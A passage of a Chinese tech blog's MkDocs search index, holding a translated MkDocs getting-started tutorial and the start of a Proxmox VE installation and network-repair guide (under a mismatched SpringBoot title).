\u200b\u7aef\u53e3\u200b\uff1a</p> <p> </p> <p>\u200b\u62e8\u53f7\u200b\u6a21\u5f0f\u200b\u7ed1\u5b9a\u200b 1 \u200b\u7aef\u53e3\u200b\u5373\u53ef\u200b\uff1a</p> <p> </p> <p>\u200b\u6700\u540e\u200b\u6d4b\u8bd5\u200b\u5747\u200b\u6b63\u5e38\u200b\uff0c\u200b\u771f\u7684\u200b\u592a\u200b\u4f18\u96c5\u200b\u4e86\u200b\uff0c\u200b\u8fd8\u200b\u8282\u7701\u200b\u4e86\u200b 1 \u200b\u4e2a\u200b\u8def\u7531\u5668\u200b\u7684\u200b\u94b1\u200b\uff1a</p> <p> </p>"},{"location":"2/1/","title":"\u4f7f\u7528\u200bMkDocs\u200b\u53d1\u5e03\u200bMarkdown\u200b\u6587\u6863","text":"<p>MkDocs \u200b\u662f\u200b\u4e00\u6b3e\u200b\u5feb\u901f\u200b\u3001\u200b\u7b80\u5355\u200b\u4e14\u200b\u6781\u5176\u200b\u51fa\u8272\u200b\u7684\u200b\u9759\u6001\u200b\u7ad9\u70b9\u200b\u751f\u6210\u5668\u200b\uff0c\u200b\u65e8\u5728\u200b\u6784\u5efa\u200b\u9879\u76ee\u200b\u6587\u6863\u200b\u3002\u200b\u6587\u6863\u200b\u6e90\u6587\u4ef6\u200b\u4ee5\u200b Markdown \u200b\u7f16\u5199\u200b\uff0c\u200b\u5e76\u200b\u4f7f\u7528\u200b\u5355\u4e2a\u200b YAML \u200b\u914d\u7f6e\u6587\u4ef6\u200b\u8fdb\u884c\u200b\u914d\u7f6e\u200b\u3002\u200b\u9996\u5148\u200b\u9605\u8bfb\u200b\u5165\u95e8\u6559\u7a0b\u200b\uff0c\u200b\u7136\u540e\u200b\u67e5\u770b\u200b \u200b\u7528\u6237\u200b\u6307\u5357\u200b\u4ee5\u200b\u4e86\u89e3\u200b\u66f4\u200b\u591a\u200b\u4fe1\u606f\u200b\u3002</p>","tags":["MkDocs","Markdown","\u9759\u6001\u7ad9\u70b9\u751f\u6210\u5668"]},{"location":"2/1/#_1","title":"\u5b89\u88c5","text":"<p>\u200b\u8981\u200b\u5b89\u88c5\u200b MkDocs\uff0c\u200b\u8bf7\u200b\u4ece\u200b\u547d\u4ee4\u884c\u200b\u8fd0\u884c\u200b\u4ee5\u4e0b\u200b\u547d\u4ee4\u200b\uff1a</p> Bash<pre><code>pip install mkdocs\n</code></pre> <p>\u200b\u6709\u5173\u200b\u8be6\u7ec6\u4fe1\u606f\u200b\uff0c\u200b\u8bf7\u53c2\u9605\u200b\u5b89\u88c5\u200b\u6307\u5357\u200b\u3002</p>","tags":["MkDocs","Markdown","\u9759\u6001\u7ad9\u70b9\u751f\u6210\u5668"]},{"location":"2/1/#_2","title":"\u521b\u5efa\u200b\u65b0\u200b\u9879\u76ee","text":"<p>\u200b\u5165\u95e8\u200b\u975e\u5e38\u7b80\u5355\u200b\u3002\u200b\u8981\u200b\u521b\u5efa\u200b\u65b0\u200b\u9879\u76ee\u200b\uff0c\u200b\u8bf7\u200b\u4ece\u200b\u547d\u4ee4\u884c\u200b\u8fd0\u884c\u200b\u4ee5\u4e0b\u200b\u547d\u4ee4\u200b\uff1a</p> Bash<pre><code>mkdocs new my-project\ncd my-project\n</code></pre> <p>\u200b\u8bf7\u82b1\u200b\u4e00\u70b9\u200b\u65f6\u95f4\u200b\u6765\u200b\u68c0\u67e5\u4e00\u4e0b\u200b\u4e3a\u200b\u60a8\u200b\u521b\u5efa\u200b\u7684\u200b\u521d\u59cb\u200b\u9879\u76ee\u200b\u3002</p> <p></p>","tags":["MkDocs","Markdown","\u9759\u6001\u7ad9\u70b9\u751f\u6210\u5668"]},{"location":"2/1/#mkdocs","title":"\u521d\u59cb\u200b MkDocs \u200b\u5e03\u5c40","text":"<p>\u200b\u6709\u200b\u4e00\u4e2a\u200b\u540d\u4e3a\u200b \u200b\u7684\u200b\u914d\u7f6e\u6587\u4ef6\u200bmkdocs.yml\uff0c\u200b\u4ee5\u53ca\u200b\u4e00\u4e2a\u200b\u540d\u4e3a\u200b \u200b\u7684\u200b\u6587\u4ef6\u5939\u200b docs\uff0c\u200b\u5176\u4e2d\u200b\u5305\u542b\u200b\u60a8\u200b\u7684\u200b\u6587\u6863\u200b\u6e90\u6587\u4ef6\u200b\uff08\u200b\u662f\u200bdocs_dirdocs\u200b\u914d\u7f6e\u200b\u8bbe\u7f6e\u200b\u7684\u200b\u9ed8\u8ba4\u503c\u200b\uff09\u3002\u200b\u76ee\u524d\u200b\uff0c\u200b\u8be5\u200b \u200b\u6587\u4ef6\u5939\u200b\u4ec5\u200b\u5305\u542b\u200b\u4e00\u4e2a\u200b\u540d\u4e3a\u200b \u200b\u7684\u200b\u6587\u6863\u200b\u9875\u9762\u200b\u3002docsindex.md</p> <p>MkDocs \u200b\u5e26\u6709\u200b\u5185\u7f6e\u200b\u5f00\u53d1\u200b\u670d\u52a1\u5668\u200b\uff0c\u200b\u53ef\u200b\u8ba9\u200b\u60a8\u200b\u5728\u200b\u5904\u7406\u200b\u6587\u6863\u200b\u65f6\u200b\u9884\u89c8\u200b\u6587\u6863\u200b\u3002\u200b\u786e\u4fdd\u60a8\u200b\u4e0e\u200bmkdocs.yml \u200b\u914d\u7f6e\u6587\u4ef6\u200b\u4f4d\u4e8e\u200b\u540c\u4e00\u200b\u76ee\u5f55\u200b\u4e2d\u200b\uff0c\u200b\u7136\u540e\u200b\u901a\u8fc7\u200b\u8fd0\u884c\u200b\u4ee5\u4e0b\u200b\u547d\u4ee4\u200b\u542f\u52a8\u200b\u670d\u52a1\u5668\u200bmkdocs serve \uff1a</p> Bash<pre><code>$ mkdocs serve\nINFO    -  Building documentation...\nINFO    -  Cleaning site directory\nINFO    -  Documentation built in 0.22 seconds\nINFO    -  [15:50:43] Watching paths for changes: 'docs', 'mkdocs.yml'\nINFO    -  [15:50:43] Serving on http://127.0.0.1:8000/\n</code></pre> <p>\u200b\u5728\u200b\u6d4f\u89c8\u5668\u200b\u4e2d\u200b\u6253\u5f00\u200bhttp://127.0.0.1:8000/\uff0c\u200b\u60a8\u200b\u5c06\u200b\u770b\u5230\u200b\u663e\u793a\u200b\u7684\u200b\u9ed8\u8ba4\u4e3b\u9875\u200b\uff1a</p> <p></p>","tags":["MkDocs","Markdown","\u9759\u6001\u7ad9\u70b9\u751f\u6210\u5668"]},{"location":"2/1/#mkdocs_1","title":"MkDocs \u200b\u5b9e\u65f6\u200b\u670d\u52a1\u5668","text":"<p>\u200b\u5f00\u53d1\u200b\u670d\u52a1\u5668\u200b\u8fd8\u200b\u652f\u6301\u200b\u81ea\u52a8\u200b\u91cd\u65b0\u200b\u52a0\u8f7d\u200b\uff0c\u200b\u5e76\u4e14\u200b\u53ea\u8981\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u3001\u200b\u6587\u6863\u200b\u76ee\u5f55\u200b\u6216\u200b\u4e3b\u9898\u76ee\u5f55\u200b\u4e2d\u200b\u7684\u200b\u4efb\u4f55\u200b\u5185\u5bb9\u200b\u53d1\u751f\u53d8\u5316\u200b\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u91cd\u5efa\u200b\u60a8\u200b\u7684\u200b\u6587\u6863\u200b\u3002</p> <p>\u200b\u5728\u200b\u60a8\u200b\u9009\u62e9\u200b\u7684\u200b\u6587\u672c\u7f16\u8f91\u200b\u5668\u4e2d\u200b\u6253\u5f00\u200bdocs/index.md\u200b\u6587\u6863\u200b\uff0c\u200b\u5c06\u200b\u521d\u59cb\u200b\u6807\u9898\u200b\u66f4\u200b\u6539\u4e3a\u200bMkLorum\uff0c\u200b\u7136\u540e\u200b\u4fdd\u5b58\u200b\u66f4\u6539\u200b\u3002\u200b\u60a8\u200b\u7684\u200b\u6d4f\u89c8\u5668\u200b\u5c06\u200b\u81ea\u52a8\u200b\u91cd\u65b0\u200b\u52a0\u8f7d\u200b\uff0c\u200b\u60a8\u200b\u5e94\u8be5\u200b\u7acb\u5373\u200b\u770b\u5230\u200b\u66f4\u65b0\u200b\u540e\u200b\u7684\u200b\u6587\u6863\u200b\u3002</p> <p>\u200b\u73b0\u5728\u200b\u5c1d\u8bd5\u200b\u7f16\u8f91\u200b\u914d\u7f6e\u6587\u4ef6\u200b\uff1amkdocs.yml\u3002\u200b\u5c06\u200b\u8bbe\u7f6e\u200b\u66f4\u6539\u200b site_name\u200b\u4e3a\u200bMkLorum\u200b\u5e76\u200b\u4fdd\u5b58\u200b\u6587\u4ef6\u200b\u3002</p> YAML<pre><code>site_name: MkLorum\n</code></pre> <p>\u200b\u60a8\u200b\u7684\u200b\u6d4f\u89c8\u5668\u200b\u5e94\u7acb\u5373\u200b\u91cd\u65b0\u200b\u52a0\u8f7d\u200b\uff0c\u200b\u5e76\u4e14\u200b\u60a8\u200b\u5c06\u200b\u770b\u5230\u200b\u65b0\u200b\u7684\u200b\u7f51\u7ad9\u200b\u540d\u79f0\u200b\u751f\u6548\u200b\u3002</p> <p>YAML<pre><code>site_name \u200b\u8bbe\u7f6e\u200b\n</code></pre> </p> <p>\u200b\u6ce8\u610f\u200b\uff1a\u200b\u914d\u7f6e\u200b\u9009\u9879\u200bsite_name\u200b\u662f\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u4e2d\u200b\u552f\u4e00\u200b\u5fc5\u9700\u200b\u7684\u200b\u9009\u9879\u200b\u3002</p>","tags":["MkDocs","Markdown","\u9759\u6001\u7ad9\u70b9\u751f\u6210\u5668"]},{"location":"2/1/#_3","title":"\u6dfb\u52a0\u200b\u9875\u9762","text":"<p>\u200b\u73b0\u5728\u200b\u5411\u200b\u60a8\u200b\u7684\u200b\u6587\u6863\u200b\u6dfb\u52a0\u200b\u7b2c\u4e8c\u9875\u200b\uff1a</p> Bash<pre><code>curl 'https://jaspervdj.be/lorem-markdownum/markdown.txt' &gt; docs/about.md\n</code></pre> <p>\u200b\u7531\u4e8e\u200b\u6211\u4eec\u200b\u7684\u200b\u6587\u6863\u200b\u7ad9\u70b9\u200b\u5c06\u200b\u5305\u542b\u200b\u4e00\u4e9b\u200b\u5bfc\u822a\u200b\u6807\u9898\u200b\uff0c\u200b\u60a8\u200b\u53ef\u80fd\u200b\u9700\u8981\u200b\u7f16\u8f91\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u5e76\u200b\u901a\u8fc7\u200b\u6dfb\u52a0\u200b\u8bbe\u7f6e\u200b\u6765\u200b\u6dfb\u52a0\u200b\u6709\u5173\u200b\u5bfc\u822a\u200b\u6807\u9898\u200b\u4e2d\u200b\u6bcf\u4e2a\u200b\u9875\u9762\u200b\u7684\u200b\u987a\u5e8f\u200b\u3001\u200b\u6807\u9898\u200b\u548c\u200b\u5d4c\u5957\u200b\u7684\u200b\u4e00\u4e9b\u200b\u4fe1\u606f\u200bnav \uff1a</p> YAML<pre><code>site_name: MkLorum\nnav:\n  - Home: index.md\n  - About: about.md\n</code></pre> <p>\u200b\u4fdd\u5b58\u200b\u66f4\u6539\u200b\uff0c\u200b\u60a8\u200b\u5c06\u200b\u770b\u5230\u200b\u4e00\u4e2a\u200b\u5bfc\u822a\u200b\u680f\u200b\uff0c \u200b\u5de6\u4fa7\u200b\u6709\u200bHome\u200b\u548c\u200b\u9879\u76ee\u200b\uff0c\u200b\u53f3\u4fa7\u200b\u6709\u200b\u3001\u200b\u548c\u200b\u9879\u76ee\u200b\u3002AboutSearchPreviousNext</p> <p></p> <p>\u200b\u5c1d\u8bd5\u200b\u83dc\u5355\u9879\u200b\u5e76\u200b\u5728\u200b\u9875\u9762\u200b\u4e4b\u95f4\u200b\u6765\u56de\u200b\u5bfc\u822a\u200b\u3002\u200b\u7136\u540e\u200b\u70b9\u51fb\u200b Search\u3002\u200b\u5c06\u200b\u51fa\u73b0\u200b\u4e00\u4e2a\u200b\u641c\u7d22\u200b\u5bf9\u8bdd\u6846\u200b\uff0c\u200b\u5141\u8bb8\u200b\u60a8\u200b\u641c\u7d22\u200b\u4efb\u4f55\u200b\u9875\u9762\u200b\u4e0a\u200b\u7684\u200b\u4efb\u4f55\u200b\u6587\u672c\u200b\u3002\u200b\u8bf7\u200b\u6ce8\u610f\u200b\uff0c\u200b\u641c\u7d22\u200b\u7ed3\u679c\u200b\u5305\u62ec\u200b\u7f51\u7ad9\u200b\u4e0a\u200b\u641c\u7d22\u8bcd\u200b\u7684\u200b\u6bcf\u6b21\u200b\u51fa\u73b0\u200b\uff0c\u200b\u5e76\u200b\u76f4\u63a5\u200b\u94fe\u63a5\u200b\u5230\u200b\u641c\u7d22\u8bcd\u200b\u51fa\u73b0\u200b\u7684\u200b\u9875\u9762\u200b\u90e8\u5206\u200b\u3002\u200b\u60a8\u200b\u65e0\u9700\u200b\u4ed8\u51fa\u200b\u4efb\u4f55\u200b\u52aa\u529b\u200b\u6216\u200b\u8fdb\u884c\u200b\u4efb\u4f55\u200b\u914d\u7f6e\u200b\u5373\u53ef\u200b\u83b7\u5f97\u200b\u6240\u6709\u200b\u8fd9\u4e9b\u200b\uff01</p> <p></p>","tags":["MkDocs","Markdown","\u9759\u6001\u7ad9\u70b9\u751f\u6210\u5668"]},{"location":"2/1/#_4","title":"\u4e3b\u9898\u200b\u5316\u200b\u6211\u4eec\u200b\u7684\u200b\u6587\u6863","text":"<p>\u200b\u73b0\u5728\u200b\u901a\u8fc7\u200b\u66f4\u6539\u200b\u4e3b\u9898\u200b\u6765\u200b\u66f4\u6539\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u4ee5\u200b\u6539\u53d8\u200b\u6587\u6863\u200b\u7684\u200b\u663e\u793a\u65b9\u5f0f\u200b\u3002\u200b\u7f16\u8f91\u200bmkdocs.yml\u200b\u6587\u4ef6\u200b\u5e76\u200b\u6dfb\u52a0\u200btheme\u200b\u8bbe\u7f6e\u200b\uff1a</p> YAML<pre><code>site_name: MkLorum\nnav:\n  - Home: index.md\n  - About: about.md\ntheme: readthedocs\n</code></pre> <p>\u200b\u4fdd\u5b58\u200b\u60a8\u200b\u7684\u200b\u66f4\u6539\u200b\uff0c\u200b\u60a8\u200b\u5c06\u200b\u770b\u5230\u200b\u6b63\u5728\u200b\u4f7f\u7528\u200b\u7684\u200b ReadTheDocs \u200b\u4e3b\u9898\u200b\u3002</p> <p></p>","tags":["MkDocs","Markdown","\u9759\u6001\u7ad9\u70b9\u751f\u6210\u5668"]},{"location":"2/1/#_5","title":"\u66f4\u200b\u591a\u200b\u63a8\u8350\u200b\u7684\u200b\u4e3b\u9898","text":"<ul> <li>mkdocs-material</li> </ul>","tags":["MkDocs","Markdown","\u9759\u6001\u7ad9\u70b9\u751f\u6210\u5668"]},{"location":"2/1/#_6","title":"\u66f4\u6539\u200b\u7f51\u7ad9\u200b\u56fe\u6807","text":"<p>\u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0cMkDocs \u200b\u4f7f\u7528\u200bMkDocs \u200b\u7f51\u7ad9\u200b\u56fe\u6807\u200b\u3002\u200b\u8981\u200b\u4f7f\u7528\u200b\u5176\u4ed6\u200b\u56fe\u6807\u200b\uff0c\u200b\u8bf7\u200b\u5728\u200b\u76ee\u5f55\u200bimg\u200b\u4e2d\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b\u5b50\u76ee\u5f55\u200bdocs\u200b\u5e76\u200b\u5c06\u200b\u60a8\u200b\u7684\u200b\u81ea\u5b9a\u4e49\u200b\u6587\u4ef6\u200b\u590d\u5236\u200bfavicon.ico \u200b\u5230\u200b\u8be5\u200b\u76ee\u5f55\u200b\u3002MkDocs \u200b\u5c06\u200b\u81ea\u52a8\u68c0\u6d4b\u200b\u5e76\u200b\u4f7f\u7528\u200b\u8be5\u200b\u6587\u4ef6\u200b\u4f5c\u4e3a\u200b\u60a8\u200b\u7684\u200b\u7f51\u7ad9\u200b\u56fe\u6807\u200b\u3002</p>","tags":["MkDocs","Markdown","\u9759\u6001\u7ad9\u70b9\u751f\u6210\u5668"]},{"location":"2/1/#_7","title":"\u5efa\u7acb\u200b\u7f51\u7ad9","text":"<p>\u200b\u770b\u8d77\u6765\u200b\u4e0d\u9519\u200b\u3002\u200b\u60a8\u200b\u5df2\u200b\u51c6\u5907\u200b\u597d\u200b\u90e8\u7f72\u200b\u6587\u6863\u200b\u7684\u200b\u7b2c\u4e00\u904d\u200bMkLorum \u3002\u200b\u9996\u5148\u200b\u6784\u5efa\u200b\u6587\u6863\u200b\uff1a</p> Bash<pre><code>mkdocs build\n</code></pre> <p>\u200b\u8fd9\u200b\u5c06\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b\u540d\u4e3a\u200b \u200b\u7684\u200b\u65b0\u200b\u76ee\u5f55\u200bsite\u3002\u200b\u67e5\u770b\u200b\u76ee\u5f55\u200b\u5185\u90e8\u200b\uff1a</p> Bash<pre><code>$ ls site\nabout  fonts  index.html  license  search.html\ncss    img    js          mkdocs   sitemap.xml\n</code></pre> <p>\u200b\u8bf7\u200b\u6ce8\u610f\u200b\uff0c\u200b\u60a8\u200b\u7684\u200b\u6e90\u200b\u6587\u6863\u200b\u5df2\u200b\u8f93\u51fa\u200b\u4e3a\u200b\u4e24\u4e2a\u200b HTML \u200b\u6587\u4ef6\u200b\uff0c\u200b\u5206\u522b\u200b\u540d\u4e3a\u200b index.html\u200b\u548c\u200babout/index.html\u3002\u200b\u60a8\u200b\u8fd8\u6709\u200b\u5404\u79cd\u200b\u5176\u4ed6\u200b\u5a92\u4f53\u200b\u5df2\u200b\u590d\u5236\u5230\u200bsite\u200b\u76ee\u5f55\u200b\u4e2d\u200b\u4f5c\u4e3a\u200b\u6587\u6863\u200b\u4e3b\u9898\u200b\u7684\u200b\u4e00\u90e8\u5206\u200b\u3002\u200b\u60a8\u200b\u751a\u81f3\u200b\u6709\u200b\u4e00\u4e2a\u200bsitemap.xml\u200b\u6587\u4ef6\u200b\u548c\u200bmkdocs/search_index.json\u3002</p> <p>\u200b\u5982\u679c\u200b\u60a8\u200b\u4f7f\u7528\u200b\u6e90\u4ee3\u7801\u200b\u63a7\u5236\u200b\uff0c\u200b\u4f8b\u5982\u200bgit\u200b\u60a8\u200b\u53ef\u80fd\u200b\u4e0d\u60f3\u200b\u5c06\u200b\u60a8\u200b\u7684\u200b\u6587\u6863\u200b\u6784\u5efa\u200b\u68c0\u67e5\u200b\u5230\u200b\u5b58\u50a8\u200b\u5e93\u4e2d\u200b\u3002 site/\u200b\u5728\u200b\u60a8\u200b\u7684\u200b.gitignore\u200b\u6587\u4ef6\u200b\u4e2d\u200b\u6dfb\u52a0\u200b\u4e00\u884c\u200b\u3002</p> Bash<pre><code>echo \"site/\" &gt;&gt; .gitignore\n</code></pre> <p>\u200b\u5982\u679c\u200b\u60a8\u200b\u6b63\u5728\u200b\u4f7f\u7528\u200b\u5176\u4ed6\u200b\u6e90\u4ee3\u7801\u200b\u63a7\u5236\u200b\u5de5\u5177\u200b\uff0c\u200b\u60a8\u200b\u5c06\u200b\u9700\u8981\u200b\u68c0\u67e5\u200b\u5176\u200b\u6587\u6863\u200b\u4ee5\u200b\u4e86\u89e3\u200b\u5982\u4f55\u200b\u5ffd\u7565\u200b\u7279\u5b9a\u200b\u76ee\u5f55\u200b\u3002</p>","tags":["MkDocs","Markdown","\u9759\u6001\u7ad9\u70b9\u751f\u6210\u5668"]},{"location":"2/1/#_8","title":"\u5176\u4ed6\u200b\u547d\u4ee4\u200b\u548c\u200b\u9009\u9879","text":"<p>\u200b\u8fd8\u6709\u200b\u5404\u79cd\u200b\u5176\u4ed6\u200b\u547d\u4ee4\u200b\u548c\u200b\u9009\u9879\u200b\u53ef\u7528\u200b\u3002\u200b\u8981\u200b\u83b7\u53d6\u200b\u5b8c\u6574\u200b\u7684\u200b\u547d\u4ee4\u200b\u5217\u8868\u200b\uff0c\u200b\u8bf7\u200b\u4f7f\u7528\u200b\u4ee5\u4e0b\u200b--help\u200b\u6807\u5fd7\u200b\uff1a</p> Bash<pre><code>mkdocs --help\n</code></pre> <p>\u200b\u8981\u200b\u67e5\u770b\u200b\u7ed9\u5b9a\u200b\u547d\u4ee4\u200b\u7684\u200b\u53ef\u7528\u200b\u9009\u9879\u200b\u5217\u8868\u200b\uff0c\u200b\u8bf7\u200b\u5c06\u200b--help\u200b\u6807\u5fd7\u200b\u4e0e\u200b\u8be5\u200b\u547d\u4ee4\u200b\u4e00\u8d77\u200b\u4f7f\u7528\u200b\u3002\u200b\u4f8b\u5982\u200b\uff0c\u200b\u8981\u200b\u83b7\u53d6\u200b\u8be5\u200b\u547d\u4ee4\u200b\u53ef\u7528\u200b\u7684\u200b\u6240\u6709\u200b\u9009\u9879\u200b\u7684\u200b\u5217\u8868\u200b\uff0c build\u200b\u8bf7\u200b\u8fd0\u884c\u200b\u4ee5\u4e0b\u200b\u547d\u4ee4\u200b\uff1a</p> Bash<pre><code>mkdocs build --help\n</code></pre>","tags":["MkDocs","Markdown","\u9759\u6001\u7ad9\u70b9\u751f\u6210\u5668"]},{"location":"2/1/#_9","title":"\u90e8\u7f72","text":"<p>\u200b\u60a8\u200b\u521a\u521a\u200b\u6784\u5efa\u200b\u7684\u200b\u6587\u6863\u200b\u7ad9\u70b9\u200b\u4ec5\u200b\u4f7f\u7528\u200b\u9759\u6001\u200b\u6587\u4ef6\u200b\uff0c\u200b\u56e0\u6b64\u200b\u60a8\u200b\u51e0\u4e4e\u200b\u53ef\u4ee5\u200b\u4ece\u200b\u4efb\u4f55\u200b\u5730\u65b9\u200b\u6258\u7ba1\u200b\u5b83\u200b\u3002\u200b\u53ea\u200b\u9700\u200b\u5c06\u200b\u6574\u4e2a\u200bsite\u200b\u76ee\u5f55\u200b\u7684\u200b\u5185\u5bb9\u200b\u4e0a\u200b\u4f20\u5230\u200b\u60a8\u200b\u6258\u7ba1\u200b\u7f51\u7ad9\u200b\u7684\u200b\u4efb\u4f55\u200b\u4f4d\u7f6e\u200b\u5373\u53ef\u200b\u3002\u200b\u6709\u5173\u200b\u4e00\u4e9b\u200b\u5e38\u89c1\u200b\u4e3b\u673a\u200b\u7684\u200b\u5177\u4f53\u200b\u8bf4\u660e\u200b\uff0c\u200b\u8bf7\u53c2\u9605\u200b \u200b\u90e8\u7f72\u200b\u6587\u6863\u200b\u9875\u9762\u200b\u3002</p>","tags":["MkDocs","Markdown","\u9759\u6001\u7ad9\u70b9\u751f\u6210\u5668"]},{"location":"2/1/#_10","title":"\u83b7\u53d6\u200b\u5e2e\u52a9","text":"<p>\u200b\u8bf7\u53c2\u9605\u200b \u200b\u7528\u6237\u200b\u6307\u5357\u200b \u200b\u4ee5\u200b\u83b7\u53d6\u200b\u6709\u5173\u200b MkDocs \u200b\u6240\u6709\u200b\u529f\u80fd\u200b\u7684\u200b\u66f4\u200b\u5b8c\u6574\u200b\u6587\u6863\u200b\u3002</p> <p>\u200b\u8981\u200b\u83b7\u5f97\u200b\u6709\u5173\u200b MkDocs \u200b\u7684\u200b\u5e2e\u52a9\u200b\uff0c\u200b\u8bf7\u200b\u4f7f\u7528\u200b GitHub Discussions \u200b\u6216\u200b GitHub Issues\u3002</p>","tags":["MkDocs","Markdown","\u9759\u6001\u7ad9\u70b9\u751f\u6210\u5668"]},{"location":"2/2/","title":"SpringBoot\u200b\u542f\u52a8\u200b\u6d41\u7a0b\u200b\u5206\u6790","text":""},{"location":"2/2/#springboot","title":"SpringBoot\u200b\u542f\u52a8\u200b\u6d41\u7a0b\u200b\u5206\u6790","text":"<p>\u200b\u5236\u4f5c\u200b\u542f\u52a8\u76d8\u200b\u7684\u200b\u65b9\u5f0f\u200b\u6709\u200b\u5f88\u591a\u200b\uff0c\u200b\u56fd\u5149\u200b\u6211\u200b\u4e0d\u518d\u200b\u8d58\u8ff0\u200b\uff0c\u200b\u4e2a\u4eba\u200b\u6bd4\u8f83\u200b\u559c\u6b22\u200b balenaEthcher \u200b\u8fd9\u4e2a\u200b\u5de5\u5177\u200b\uff0c\u200b\u754c\u9762\u200b\u7b80\u5355\u200b\u76f4\u89c2\u200b\uff1a</p> <p> </p>"},{"location":"2/2/#_1","title":"\u5b89\u88c5\u200b\u6d41\u7a0b","text":"<p>\u200b\u6574\u4e2a\u200b PVE \u200b\u5b89\u88c5\u200b\u8fc7\u7a0b\u200b\u5f88\u200b\u7b80\u5355\u200b\uff0c\u200b\u6240\u4ee5\u200b\u4e0b\u9762\u200b\u53ea\u653e\u200b\u5173\u952e\u200b\u7684\u200b\u622a\u56fe\u200b\u3002\u200b\u9996\u5148\u200b\u9009\u62e9\u200b\u4e00\u4e2a\u200b\u4f60\u200b\u51c6\u5907\u200b\u597d\u200b\u5b89\u88c5\u200b PVE \u200b\u7684\u200b\u6574\u4e2a\u200b\u78c1\u76d8\u200b\uff0c\u200b\u6211\u200b\u9009\u62e9\u200b\u7684\u200b\u662f\u200b 250GB \u200b\u7684\u200b WD SN550\uff1a</p> <p> </p> <p>\u200b\u9009\u62e9\u200b\u8fd9\u4e48\u200b\u5c0f\u200b\u5bb9\u91cf\u200b\u7684\u200b\u786c\u76d8\u200b\uff0c\u200b\u662f\u56e0\u4e3a\u200b PVE \u200b\u4f1a\u200b\u81ea\u52a8\u200b\u628a\u200b\u9009\u62e9\u200b\u7684\u200b\u786c\u76d8\u200b\u5212\u5206\u200b\u4e3a\u200b\u865a\u62df\u673a\u200b\u5b58\u653e\u200b\u548c\u200b\u6a21\u677f\u200b\u6587\u4ef6\u200b\u7684\u200b\u4e24\u4e2a\u200b\u533a\u200b\uff0c\u200b\u611f\u89c9\u200b\u4e0d\u662f\u200b\u5f88\u200b\u5408\u7406\u200b\u3002\u200b\u6240\u4ee5\u200b\u56fd\u5149\u200b\u6211\u200b\u5e72\u8106\u200b\u76f4\u63a5\u200b\u7528\u4e2a\u200b\u5c0f\u200b\u5bb9\u91cf\u200b\u786c\u76d8\u200b\u5355\u72ec\u200b\u6765\u200b\u5b89\u88c5\u200b\u865a\u62df\u673a\u200b\uff0c\u200b\u8fd9\u6837\u200b\u54ea\u6015\u200b\u662f\u200b\u4e0d\u5408\u7406\u200b\u7684\u200b\u5206\u533a\u200b\u4e5f\u200b\u4e0d\u200b\u53ef\u60dc\u200b\u4e86\u200b\u3002</p> <p>\u200b\u9009\u62e9\u200b\u597d\u200b\u81ea\u5df1\u200b\u7684\u200b\u7f51\u5361\u200b\uff0c\u200b\u7136\u540e\u200b\u914d\u7f6e\u200b 1 \u200b\u4e2a\u200b\u9759\u6001\u200b IP\uff0c\u200b\u6839\u636e\u200b\u81ea\u5df1\u200b\u7684\u200b\u5b9e\u9645\u200b\u60c5\u51b5\u200b\u914d\u7f6e\u200b\u7f51\u5173\u200b\u3001DNS \u200b\u7b49\u200b\uff1a</p> <p> </p> <p>\u200b\u6700\u540e\u200b\u6ca1\u200b\u95ee\u9898\u200b\u7684\u8bdd\u200b\uff0c\u200b\u70b9\u51fb\u200b\u300cInstall\u300d\u200b\u5b89\u88c5\u200b\u5b8c\u6210\u200b\u81ea\u52a8\u200b\u91cd\u542f\u200b\u5c31\u200b\u5b89\u88c5\u200b\u5b8c\u6bd5\u200b\u4e86\u200b\u3002</p>"},{"location":"2/2/#_2","title":"\u7f51\u7edc\u200b\u4fee\u590d","text":"<p>\u200b\u8fd9\u4e2a\u200b\u4e00\u4e2a\u200b\u6d41\u4f20\u200b\u5df2\u4e45\u200b\u7684\u200b PVE BUG\uff0c\u200b\u5373\u5f53\u200b\u6211\u4eec\u200b\u7684\u200b PCIe \u200b\u7684\u200b\u786c\u4ef6\u200b\u53d1\u751f\u200b\u53d8\u52a8\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u6211\u4eec\u200b\u7684\u200b PVE \u200b\u7f51\u7edc\u200b\u4f1a\u200b\u51fa\u73b0\u200b\u6545\u969c\u200b\uff0c\u200b\u867d\u7136\u200b\u53ef\u4ee5\u200b\u6b63\u5e38\u200b\u5f00\u673a\u200b\uff0c\u200b\u4f46\u662f\u200b\u5e76\u200b\u6ca1\u6709\u200b\u771f\u6b63\u200b\u83b7\u53d6\u200b\u5230\u200b IP \u200b\u5730\u5740\u200b\uff0c\u200b\u5bfc\u81f4\u200b PVE \u200b\u670d\u52a1\u5668\u200b ping \u200b\u4e0d\u901a\u200b\uff0cPVE \u200b\u7684\u200b  Web UI \u200b\u63a7\u5236\u53f0\u200b\u6ca1\u6cd5\u200b\u8bbf\u95ee\u200b\uff0c\u200b\u5c31\u200b\u50cf\u200b\u4e0b\u9762\u200b\u4e00\u6837\u200b\uff1a</p> <p> </p> \u200b\u5982\u679c\u200b\u56e0\u4e3a\u200b\u4fee\u6539\u200b\u4e86\u200b\u76f4\u901a\u200b\u663e\u5361\u200b\uff0c\u200b\u65e0\u6cd5\u200b\u8fdb\u200b\u8fd9\u4e2a\u200b\u4ea4\u4e92\u200b shell \u200b\u754c\u9762\u200b\u7684\u8bdd\u200b......  \u200b\u70b9\u51fb\u200b\u5c55\u5f00\u200b\u89e3\u51b3\u529e\u6cd5\u200b \ud83d\udc49 <p>\u200b\u53ef\u4ee5\u200b\u5728\u200b\u5f00\u673a\u200b\u9009\u62e9\u200b\u7cfb\u7edf\u200b\u7684\u200b\u65f6\u5019\u200b\u9009\u62e9\u200b\u300c\u200b\u9ad8\u7ea7\u200b\u9009\u9879\u200b\u300d\uff1a  \u200b\u7136\u540e\u200b\u9009\u62e9\u200b\u300crecovery mode \u200b\u6062\u590d\u6a21\u5f0f\u200b\u300d\u200b\u5373\u53ef\u200b\uff1a </p> <p>\u200b\u7ec6\u5fc3\u200b\u7684\u200b\u5c0f\u4f19\u4f34\u200b\u53d1\u73b0\u200b\uff0c\u200b\u6211\u4eec\u200b PVE 